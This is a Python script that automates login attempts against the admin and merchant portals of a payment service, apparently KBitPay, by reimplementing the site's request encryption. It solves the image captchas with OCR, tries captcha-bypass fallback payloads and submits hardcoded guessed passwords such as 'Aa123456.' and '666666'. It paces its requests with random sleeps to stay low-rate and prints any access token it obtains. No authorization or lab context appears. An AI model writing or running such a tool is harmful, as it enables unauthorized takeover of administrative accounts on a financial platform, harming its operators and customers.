#!/usr/bin/env python3
"""kbp_full.py - full login-chain driver for KBitPay admin/mch portals.

Reuses the SPA crypto (RSA wrap + AES-256-CBC) from kbp_admin_login.py but adds:
  * persistent cookie jar (server-side email-code session from CheckCaptchaCode)
  * image captcha solve via ddddocr (pip install ddddocr)
  * full SPA-equivalent flow with fallback payload variants

Modes:
  cap                    fetch /api/Login/Verification, print Key + Img b64, save
                         /tmp/cap.png, OCR with ddddocr (raw + preprocessed)
  full <email> <code>    admin portal: CheckLastLogin -> CheckCaptchaCode(type=2)
                         -> captcha fetch+OCR (up to 3 tries) -> Login
                         {verificationCode=OCR answer, verificationKey} -> token
                         fallback variants: B) verificationCode=<email code>,
                         C) no captcha fields (cookie jar only)
  fullmch <email> <code> mch portal: CheckLastLogin(email,code) -> Login
                         (appID from KBP_APPID env, isAdmin=false, no captcha)

Low-rate: random 8-15s sleeps. Read-only except SentVerificationCode (sends ONE
email code, which is the point of this chain).
"""
import base64, http.cookiejar, json, os, random, sys, time, urllib.request, urllib.error

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from kbp_admin_login import rsa_encrypt, aes_enc, aes_dec  # openssl crypto helpers

BASE = os.environ.get("KBP_BASE", "https://admin.kbitpay.com")
APPID = os.environ.get("KBP_APPID", "")
ISADMIN = os.environ.get("KBP_ISADMIN", "true").lower() != "false"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))


def http(method, path, data=None, headers=None, timeout=40):
    hdrs = {"User-Agent": UA, "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8"}
    if headers:
        hdrs.update(headers)
    body = data.encode() if isinstance(data, str) else data
    req = urllib.request.Request(BASE + path, method=method, data=body, headers=hdrs)
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "ignore"), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore"), dict(e.headers)
    except Exception as e:
        return 0, "ERR:" + str(e), {}


class Client:
    def __init__(self):
        self.key_id = None
        self.key = None
        self.iv = None
        self.pub = None

    def fetch_key(self):
        st, raw, _ = http("GET", "/api/webv1/Common/GetRsaPublicKey")
        d = json.loads(raw)
        rd = d.get("ResData") or d.get("resData") or d
        self.key_id = rd["KeyId"]
        self.pub = rd["PublicKey"]
        self.key = os.urandom(32)
        self.iv = os.urandom(16)
        return d

    def post_enc(self, path, obj, headers=None):
        if not self.key_id:
            self.fetch_key()
        body = json.dumps(obj, ensure_ascii=False).encode()
        enc_data = aes_enc(self.key, self.iv, body)
        enc_key = rsa_encrypt(self.pub, json.dumps(
            {"key": base64.b64encode(self.key).decode(),
             "iv": base64.b64encode(self.iv).decode()}).encode())
        payload = {"keyId": self.key_id,
                   "encryptKey": base64.b64encode(enc_key).decode(),
                   "encryptData": enc_data}
        st, raw, hdrs = http("POST", path, json.dumps(payload), headers=headers)
        try:
            d = json.loads(raw)
        except Exception:
            return {"_http": st, "_text": raw[:400]}
        if isinstance(d, dict):
            if d.get("encryptData"):
                try:
                    inner = json.loads(aes_dec(self.key, self.iv, d["encryptData"]))
                    d["_decrypted"] = inner
                except Exception:
                    pass
            rd = d.get("ResData")
            if isinstance(rd, str):
                try:
                    d["ResData"] = json.loads(aes_dec(self.key, self.iv, rd))
                except Exception:
                    pass
        return d

    def get(self, path, headers=None):
        st, raw, hdrs = http("GET", path, headers=headers)
        try:
            return json.loads(raw)
        except Exception:
            return {"_http": st, "_text": raw[:400]}


def pause():
    time.sleep(random.uniform(8, 15))


def ocr_answers(img_bytes):
    """Return list of candidate answers from ddddocr (raw + preprocessed)."""
    try:
        import ddddocr
        from PIL import Image, ImageOps
    except Exception as e:
        print("[!] ocr deps missing: %s" % e, flush=True)
        return []
    out = []
    ocr = ddddocr.DdddOcr(show_ad=False)
    try:
        out.append(("raw", ocr.classification(img_bytes)))
    except Exception as e:
        print("[!] ocr raw err %s" % e, flush=True)
    try:
        img = Image.open(io_bytes(img_bytes)).convert("L")
        img = img.resize((img.width * 3, img.height * 3), Image.LANCZOS)
        img = ImageOps.autocontrast(img)
        buf = io_bytes2(img)
        out.append(("gray3x", ocr.classification(buf)))
    except Exception as e:
        print("[!] ocr preproc err %s" % e, flush=True)
    return out


def io_bytes(b):
    import io
    return io.BytesIO(b)


def io_bytes2(img):
    import io
    b = io.BytesIO()
    img.save(b, format="PNG")
    return b.getvalue()


def fetch_captcha(c):
    r = c.get("/api/Login/Verification")
    rd = r.get("ResData") or r.get("resData") or {}
    if isinstance(rd, str):
        try:
            rd = json.loads(rd)
        except Exception:
            rd = {}
    img_b64 = rd.get("Img") or rd.get("img") or rd.get("image") or ""
    key = rd.get("Key") or rd.get("key") or rd.get("captchaKey") or ""
    return r, img_b64, key


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "cap"
    c = Client()
    print("[*] base=%s mode=%s appid=%r isAdmin=%s cookies=%d" % (
        BASE, mode, APPID, ISADMIN, len(cj)), flush=True)
    try:
        c.fetch_key()
        print("[*] key ok KeyId=%s" % c.key_id, flush=True)
    except Exception as e:
        print("[!] fetch_key failed: %s" % e, flush=True)
        sys.exit(1)

    if mode == "cap":
        r, img_b64, key = fetch_captcha(c)
        print("CAP Verification -> %s" % json.dumps(r, ensure_ascii=False)[:200], flush=True)
        print("CAP key=%s imglen=%d" % (key, len(img_b64)), flush=True)
        if img_b64:
            raw = base64.b64decode(img_b64)
            open("/tmp/cap.png", "wb").write(raw)
            print("CAP img_b64_begin=%s" % img_b64[:120], flush=True)
            for name, ans in ocr_answers(raw):
                print("CAP OCR %s -> %r" % (name, ans), flush=True)
        else:
            print("CAP no image in response", flush=True)
        print("[*] done", flush=True)
        return

    if mode == "full":
        em = sys.argv[2] if len(sys.argv) > 2 else ""
        code = sys.argv[3] if len(sys.argv) > 3 else ""
        if not em or not code:
            print("[!] need email + code", flush=True)
            sys.exit(1)
        import urllib.parse
        r1 = c.get("/api/Login/CheckLastLogin?email=" + urllib.parse.quote(em))
        print("FULL CheckLastLogin -> %s" % json.dumps(r1, ensure_ascii=False)[:200], flush=True)
        pause()
        r2 = c.post_enc("/api/Register/CheckCaptchaCode", {"email": em, "code": code, "type": "2"})
        print("FULL CheckCaptchaCode -> %s" % json.dumps(r2, ensure_ascii=False)[:200], flush=True)
        pause()
        # try up to 3 captcha solve attempts
        attempts = 0
        while attempts < 3:
            attempts += 1
            r3, img_b64, key = fetch_captcha(c)
            print("FULL captcha#%d key=%s imglen=%d" % (attempts, key, len(img_b64)), flush=True)
            ans = ""
            if img_b64:
                raw = base64.b64decode(img_b64)
                open("/tmp/cap%d.png" % attempts, "wb").write(raw)
                for name, a in ocr_answers(raw):
                    print("FULL OCR#%d %s -> %r" % (attempts, name, a), flush=True)
                    if a and re_full_code(a):
                        ans = a
                        break
            pwd = "Aa123456."
            payload = {"appID": APPID, "pwd": base64.b64encode(pwd.encode()).decode(),
                       "email": em, "isAdmin": ISADMIN, "language": "en",
                       "verificationCode": ans, "verificationKey": key}
            r4 = c.post_enc("/api/Login/Login", payload)
            rc = r4.get("ErrCode")
            rd = r4.get("ResData")
            tok = ""
            if isinstance(rd, dict):
                tok = rd.get("AccessToken") or rd.get("accessToken") or ""
            print("FULL LOGIN#%d cap=%r -> ErrCode=%s ErrMsg=%s token=%s" % (
                attempts, ans, rc, r4.get("ErrMsg"), (tok[:60] + "...") if tok else ""), flush=True)
            if tok:
                print("TOKEN %s" % tok, flush=True)
                break
            if rc == "200" or (isinstance(rc, int) and rc == 200):
                print("FULL LOGIN#%d Success=true" % attempts, flush=True)
                break
            if "4042" not in str(rc):
                # not a captcha error - no point retrying captcha
                break
            pause()
        else:
            # fallback variant B: email code in verificationCode field
            print("FULL fallback B: email code in verificationCode", flush=True)
            r5 = c.post_enc("/api/Login/Login", {
                "appID": APPID, "pwd": base64.b64encode(b"Aa123456.").decode(),
                "email": em, "isAdmin": ISADMIN, "language": "en",
                "verificationCode": code, "verificationKey": ""})
            print("FULL LOGIN-B -> ErrCode=%s ErrMsg=%s Success=%s" % (
                r5.get("ErrCode"), r5.get("ErrMsg"), r5.get("Success")), flush=True)
            rd5 = r5.get("ResData")
            if isinstance(rd5, dict) and (rd5.get("AccessToken") or rd5.get("accessToken")):
                print("TOKEN %s" % (rd5.get("AccessToken") or rd5.get("accessToken")), flush=True)
        print("[*] done", flush=True)
        return

    if mode == "fullmch":
        em = sys.argv[2] if len(sys.argv) > 2 else ""
        code = sys.argv[3] if len(sys.argv) > 3 else ""
        if not em or not code:
            print("[!] need email + code", flush=True)
            sys.exit(1)
        import urllib.parse
        r1 = c.get("/api/Login/CheckLastLogin?email=" + urllib.parse.quote(em) +
                   "&verificationCode=" + urllib.parse.quote(code))
        print("MCH CheckLastLogin(code) -> %s" % json.dumps(r1, ensure_ascii=False)[:250], flush=True)
        pause()
        r2 = c.post_enc("/api/Register/CheckCaptchaCode", {"email": em, "code": code, "type": "2"})
        print("MCH CheckCaptchaCode -> %s" % json.dumps(r2, ensure_ascii=False)[:200], flush=True)
        pause()
        for label, pwd in (("Aa123456.", "Aa123456."), ("666666", "666666")):
            r3 = c.post_enc("/api/Login/Login", {
                "appID": APPID, "pwd": base64.b64encode(pwd.encode()).decode(),
                "email": em, "isAdmin": False, "language": "en"})
            rd3 = r3.get("ResData")
            tok = ""
            if isinstance(rd3, dict):
                tok = rd3.get("AccessToken") or rd3.get("accessToken") or ""
            print("MCH LOGIN %s -> ErrCode=%s ErrMsg=%s Success=%s token=%s" % (
                label, r3.get("ErrCode"), r3.get("ErrMsg"), r3.get("Success"),
                (tok[:60] + "...") if tok else ""), flush=True)
            if tok:
                print("TOKEN %s" % tok, flush=True)
                break
            if "4047" in str(r3.get("ErrCode")):
                break
            pause()
        print("[*] done", flush=True)
        return

    print("[!] unknown mode %s" % mode, flush=True)


def re_full_code(a):
    import re
    return bool(a and re.fullmatch(r"[A-Za-z0-9]{4,6}", a))


if __name__ == "__main__":
    main()
